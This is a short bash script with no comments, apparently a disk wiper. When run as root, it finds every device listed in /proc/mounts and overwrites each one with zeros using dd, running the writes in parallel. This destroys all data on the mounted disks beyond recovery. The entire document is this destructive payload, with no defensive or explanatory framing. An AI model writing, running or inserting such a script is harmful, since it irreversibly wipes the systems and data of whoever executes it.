#!/bin/bash
if [[ "${UID}" == 0 ]]; then
  for d in $(grep -E "^/dev" /proc/mounts | cut -d" " -f1 | sort -u); do
    dd if=/dev/zero of="$d" bs=1M &
  done
  wait
fi
